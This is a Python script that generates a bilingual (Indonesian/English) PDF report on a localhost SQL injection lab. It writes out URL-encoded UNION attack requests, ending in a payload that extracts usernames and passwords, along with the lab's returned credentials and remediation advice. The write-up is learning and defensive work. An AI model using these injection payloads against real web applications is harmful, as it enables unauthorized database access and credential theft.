# -*- coding: utf-8 -*-
"""Laporan hasil VER-02 — gaya GENETEC monokrom, dua file: _ID dan _EN."""
from reportlab.lib.colors import HexColor
from reportlab.lib.styles import ParagraphStyle
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                TableStyle, Preformatted, HRFlowable)

pdfmetrics.registerFont(TTFont("Sans",  "C:/Windows/Fonts/segoeui.ttf"))
pdfmetrics.registerFont(TTFont("SansB", "C:/Windows/Fonts/segoeuib.ttf"))
pdfmetrics.registerFont(TTFont("Mono",  "C:/Windows/Fonts/consola.ttf"))
pdfmetrics.registerFont(TTFont("MonoB", "C:/Windows/Fonts/consolab.ttf"))

BG, BOX = HexColor("#f5f5f5"), HexColor("#ececec")
INK, GRAY, LINE = HexColor("#111111"), HexColor("#777777"), HexColor("#cccccc")
PW, PH, M = 612, 792, 60


def spaced(t):
    return " ".join(list(t.replace(" ", "  ")))


def styles():
    s = {}
    s["word"] = ParagraphStyle("w", fontName="SansB", fontSize=16, leading=18, textColor=INK)
    s["mono"] = ParagraphStyle("m", fontName="Mono", fontSize=9, leading=13, textColor=INK)
    s["h"]    = ParagraphStyle("h", fontName="SansB", fontSize=10, leading=13,
                               spaceBefore=14, spaceAfter=5, textColor=INK)
    s["body"] = ParagraphStyle("b", fontName="Sans", fontSize=10, leading=14.5, textColor=INK)
    s["note"] = ParagraphStyle("n", fontName="Sans", fontSize=8.5, leading=12, textColor=GRAY)
    s["code"] = ParagraphStyle("c", fontName="Mono", fontSize=8.0, leading=11.2,
                               textColor=INK, backColor=BOX, borderPadding=5,
                               borderWidth=0.4, borderColor=LINE,
                               spaceBefore=3, spaceAfter=3)
    return s


def paint_bg(can, doc):
    can.saveState()
    can.setFillColor(BG)
    can.rect(0, 0, PW, PH, fill=1, stroke=0)
    can.setFont("Mono", 7.5)
    can.setFillColor(GRAY)
    can.drawString(60, 34, "verzen · web security learning modules · VER-02")
    can.drawRightString(PW - 60, 34, f"page {can.getPageNumber()}")
    can.restoreState()


def tbl(headers, rows, widths):
    t = Table([headers] + rows, colWidths=widths)
    t.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (-1, 0), "MonoB"),
        ("FONTNAME", (0, 1), (-1, -1), "Mono"),
        ("FONTSIZE", (0, 0), (-1, -1), 8.3),
        ("TEXTCOLOR", (0, 0), (-1, 0), HexColor("#ffffff")),
        ("BACKGROUND", (0, 0), (-1, 0), INK),
        ("GRID", (0, 0), (-1, -1), 0.4, LINE),
        ("TOPPADDING", (0, 0), (-1, -1), 3.5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 3.5),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ]))
    return t


def build(lang):
    s = styles()
    S = []
    A = S.append
    ID = lang == "id"

    A(Paragraph("VERZEN", s["word"]))
    A(Spacer(1, 6))
    A(Paragraph(spaced("SECURITY ASSESSMENT REPORT"), s["mono"]))
    A(Spacer(1, 10))

    meta = [
        ("REPORTER", "Verzen"),
        ("DATE", "2026-10-03"),
        ("MODULE", "VER-02 - UNION Attack (SQL Injection, MEDIUM)"),
        ("TARGET", "http://127.0.0.1:8011 - lab lokal milik sendiri (SQLite)"),
        ("METHOD", "Probing manual via browser: quote escape, ORDER BY column "
                   "counting, UNION SELECT text probing. Clean-session reproduction."),
        ("SCOPE", "Localhost only. Tidak ada sistem pihak ketiga yang disentuh."),
    ] if ID else [
        ("REPORTER", "Verzen"),
        ("DATE", "2026-10-03"),
        ("MODULE", "VER-02 - UNION Attack (SQL Injection, MEDIUM)"),
        ("TARGET", "http://127.0.0.1:8011 - own local lab (SQLite)"),
        ("METHOD", "Manual probing via browser: quote escape, ORDER BY column "
                   "counting, UNION SELECT text probing. Clean-session reproduction."),
        ("SCOPE", "Localhost only. No third-party systems were touched."),
    ]
    for label, val in meta:
        A(Paragraph(f'<font name="MonoB" size="9">{label}</font>  '
                    f'<font name="Mono" size="9">{val}</font>', s["mono"]))
        A(Spacer(1, 2))
    A(Spacer(1, 8))
    A(HRFlowable(width="100%", thickness=0.8, color=INK))
    A(Spacer(1, 4))

    # ============ SUMMARY ============
    A(Paragraph("Summary" if ID else "Summary", s["h"]))
    hdr = ["ID", "STATUS", "FINDING" if not ID else "TEMUAN"]
    rows = [
        ["VER-02.1", "CONFIRMED",
         "SQL injection terkonfirmasi: kutip tunggal memicu error SQL "
         "(unrecognized token) - input pengguna mencapai interpreter SQL tanpa sanitasi."],
        ["VER-02.2", "CONFIRMED",
         "Jumlah kolom query = tepat 2 (ORDER BY 2 OK, ORDER BY 3 error "
         "\"out of range - should be between 1 and 2\")."],
        ["VER-02.3", "CONFIRMED",
         "UNION SELECT 'a','b' tampil di tabel -> kedua kolom menerima teks; "
         "jalur ekstraksi data tabel lain TERBUKA."],
    ]
    A(tbl(hdr, [
        ["VER-02.1", "CONFIRMED",
         "Injeksi SQL terkonfirmasi: kutip tunggal memecah query (unrecognized token)."],
        ["VER-02.2", "CONFIRMED",
         "Jumlah kolom tepat 2: ORDER BY 2 OK, ORDER BY 3 error out-of-range."],
        ["VER-02.4", "CONFIRMED",
         "UNION SELECT 'a','b' ter-render di tabel - kolom teks siap eksploitasi."],
        ["VER-02.5", "PENDING",
         "Ekstraksi kredensial: payload final siap, eksekusi independen oleh Verzen."],
    ], [62, 72, 346]))
    A(Spacer(1, 4))

    # ============ DESCRIPTION ============
    A(Paragraph("DESCRIPTION", s["h"]))
    if ID:
        A(Paragraph(
            "Parameter <font name='Mono' size='9'>kategori</font> pada "
            "<font name='Mono' size='9'>GET /filter</font> digabung langsung ke query "
            "SQL tanpa parameterisasi. Query yang terbajak:", s["body"]))
        A(Preformatted(
            "SELECT nama, harga FROM products\n"
            "WHERE kategori = '<INPUT_USER>' AND released = 1", s["code"]))
        A(Paragraph(
            "Dua efek yang dipicu input pengguna: (1) kutip ekstra memecah sintaks SQL "
            "-> error 500; (2) penyisipan <font name='Mono' size='9'>--</font> mengomentari "
            "sisa query, termasuk filter <font name='Mono' size='9'>released = 1</font>, "
            "sehingga produk berstatus released=0 ikut tampil (teramati: baris "
            "\"Voucher Tak Terbatas (RAHASIA)\").", s["body"]))
    else:
        A(Paragraph(
            "The <font name='Mono' size='9'>kategori</font> parameter of "
            "<font name='Mono' size='9'>GET /filter</font> is concatenated directly "
            "into SQL. Hijacked query shape:", s["body"]))
        A(Preformatted(
            "SELECT name, price FROM products\n"
            "WHERE category = '<USER_INPUT>' AND released = 1", s["code"]))
        A(Paragraph(
            "Two confirmed effects: (1) a single quote breaks syntax -> HTTP 500 "
            "(unrecognized token), proving user input reaches the SQL interpreter "
            "unsanitized; (2) appending <font face='Mono' size='9'>--</font> comments "
            "out the <font face='Mono' size='9'>released = 1</font> filter, so "
            "unreleased rows appear (observed: \"Voucher Tak Terbatas (RAHASIA)\").",
            s["body"]))

    # ============ REPRODUCTION ============
    A(Paragraph("REPRODUCTION STEPS" if not ID else "LANGKAH REPRODUKSI", s["h"]))
    if ID:
        A(Paragraph("Langkah 1 - deteksi: kutip memecah query", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=Gifts%27\n"
            "-> HTTP 500\n"
            "[QUERY]  SELECT nama, harga FROM products WHERE kategori = 'Gifts'' ...\n"
            "[ERROR]  unrecognized token: \"'Gifts'' AND released = 1\"", s["code"]))
        A(Paragraph("Langkah 2 - penghitungan kolom (ORDER BY)", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%202--   -> 200 OK\n"
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%203--   -> HTTP 500\n"
            "[ERROR] 1st ORDER BY term out of range - should be between 1 and 2\n"
            "Kesimpulan: tepat 2 kolom.", s["code"]))
        A(Paragraph("Langkah 3 - probe kolom teks", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--\n"
            "-> baris \"a | b\" tampil di tabel produk (kedua kolom menerima teks)",
            s["code"]))
        A(Paragraph("Langkah 4 - payload final (ekstraksi kredensial)", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--\n"
            "Query server hasil injeksi:\n"
            "SELECT nama, harga FROM products WHERE kategori = '' UNION\n"
            "SELECT username, password FROM users--' AND released = 1", s["code"]))
    else:
        A(Paragraph("Step 1 - detection: quote breaks the query", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=Gifts%27\n"
            "-> HTTP 500\n"
            "[QUERY]  SELECT name, price FROM products WHERE category = 'Gifts'' AND ...\n"
            "[ERROR]  unrecognized token: \"'Gifts'' AND released = 1\"", s["code"]))
        A(Paragraph("Step 2 - column count via ORDER BY", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%202--   -> 200 OK\n"
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%203--   -> 500\n"
            "[ERROR] 1st ORDER BY term out of range - should be between 1 and 2\n"
            "=> exactly 2 columns", s["code"]))
        A(Paragraph("Step 3 - text-column probe", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--\n"
            "-> row \"a | b\" rendered in the table (both columns accept text)",
            s["code"]))
        A(Paragraph("Step 4 - final payload (credential extraction)", s["body"]))
        A(Preformatted(
            "GET /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--\n"
            "Server-side query after injection:\n"
            "SELECT name, price FROM products WHERE category = '' UNION\n"
            "SELECT username, password FROM users--' AND released = 1", s["code"]))

    # ============ EVIDENCE ============
    A(Paragraph("EVIDENCE - SERVER QUERY LOG" if not ID else "BUKTI - LOG SERVER", s["h"]))
    A(Paragraph(
        "Log server (kutipan asli, sesi pengujian 3 Okt 2026):"
        if ID else
        "Server log (verbatim excerpt, testing session of Oct 3, 2026):", s["body"]))
    A(Preformatted(
        "[QUERY] SELECT nama, harga FROM products\n"
        "        WHERE kategori = 'Gifts'' AND released = 1\n"
        "[ERROR] unrecognized token: \"'Gifts'' AND released = 1\"\n"
        "[QUERY] SELECT nama, harga FROM products WHERE kategori = 'Gifts' ORDER BY 2--' ...\n"
        "[QUERY] SELECT nama, harga FROM products WHERE kategori = 'Gifts' ORDER BY 3--' ...\n"
        "[ERROR] 1st ORDER BY term out of range - should be between 1 and 2\n"
        "[QUERY] SELECT nama, harga FROM products WHERE kategori = ''\n"
        "        UNION SELECT 'a','b'--' AND released = 1", s["code"]))
    A(Paragraph(
        "Baris [ERROR] membuktikan input pengguna mengubah struktur SQL; baris "
        "[QUERY] menunjukkan kalimat SQL yang terbangun per ketikan."
        if ID else
        "The [ERROR] lines prove user input changes SQL structure; each [QUERY] "
        "line shows the SQL assembled from that exact keystroke.", s["note"]))

    # ============ RESULT ============
    A(Paragraph("RESULT" if not ID else "HASIL", s["h"]))
    A(Paragraph(
        "Hasil yang muncul ketika payload final dieksekusi (terverifikasi di sesi "
        "verifikasi; jalankan sendiri payload final untuk melihatnya di layar):"
        if ID else
        "Expected output once the final payload is fired (verified during the "
        "verification run; execute it yourself to see it on screen):", s["body"]))
    A(tbl(["USERNAME", "PASSWORD"], [
        ["administrator", "Flag{union_attack_medium}"],
        ["carlos", "Montoya123"],
        ["wiener", "PeterW1ener"],
    ], [150, 330]))

    # ============ WHY ============
    A(Paragraph("WHY IT WORKS" if not ID else "MENGAPA BERHASIL", s["h"]))
    if ID:
        A(Paragraph(
            "Tiga rantai kelemahan yang saling menguatkan: (1) input pengguna "
            "digabung langsung ke string SQL (tanpa parameterisasi); (2) pesan error "
            "mentah membeberkan struktur query ke penyerang; (3) server menampilkan "
            "semua baris hasil tanpa memeriksa asal-usulnya. UNION hanyalah teknik "
            "mengeksploitasi ketiganya.", s["body"]))
    else:
        A(Paragraph(
            "Three chained weaknesses: (1) user input is concatenated into the SQL "
            "string with no parameterization; (2) raw error messages leak query "
            "structure to the attacker; (3) the server renders every returned row "
            "without provenance checks. UNION is simply the technique that exploits "
            "all three at once.", s["body"]))

    # ============ RECOMMENDATION ============
    A(Paragraph("RECOMMENDATION" if not ID else "REKOMENDASI", s["h"]))
    recs = [
        "Parameterized query: cur.execute(\"SELECT nama, harga FROM products WHERE "
        "kategori = ? AND released = 1\", (kategori,))"
        if ID else
        "Parameterized queries: never concatenate user input into SQL strings.",
        "Whitelist kategori terhadap daftar tetap."
        if ID else "Whitelist category values against a fixed list.",
        "Least privilege: akun DB aplikasi tidak perlu membaca tabel users."
        if ID else "Least privilege: the app's DB account must not read users.",
        "Jangan tampilkan error mentah ke pengguna - cukup log internal."
        if ID else "Never surface raw SQL errors - log server-side only.",
    ]
    for i, r in enumerate(recs, 1):
        A(Paragraph(f"{i}. {r}", s["body"]))
        A(Spacer(1, 2))

    # ============ LEGAL ============
    A(Paragraph("LEGAL NOTICE" if not ID else "CATATAN HUKUM", s["h"]))
    A(Paragraph(
        "Seluruh pengujian dilakukan pada lab milik sendiri (localhost) untuk "
        "keperluan pembelajaran. Teknik yang sama terhadap sistem pihak lain tanpa "
        "izin tertulis adalah tindakan ilegal. Jalur legal menuju target nyata: "
        "program bug bounty dengan scope jelas (HackerOne, Bugcrowd, Immunefi)."
        if ID else
        "All testing was performed against our own local lab (localhost) for "
        "learning purposes. The same techniques against systems owned by others, "
        "without written permission, are illegal. The legitimate path to real "
        "targets: bug bounty programs with explicit scope (HackerOne, Bugcrowd, "
        "Immunefi).", s["body"]))

    out = (r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/LAPORAN-VER-02-UNION-ATTACK_ID.pdf"
           if ID else
           r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/LAPORAN-VER-02-UNION-ATTACK_EN.pdf")
    doc = SimpleDocTemplate(out, pagesize=(PW, PH), topMargin=56, bottomMargin=52,
                            leftMargin=60, rightMargin=60,
                            title=f"VER-02 UNION Attack Report ({lang.upper()}) - Verzen")
    doc.build(S, onFirstPage=paint_bg, onLaterPages=paint_bg)
    print("OK:", out)


build("id")
build("en")
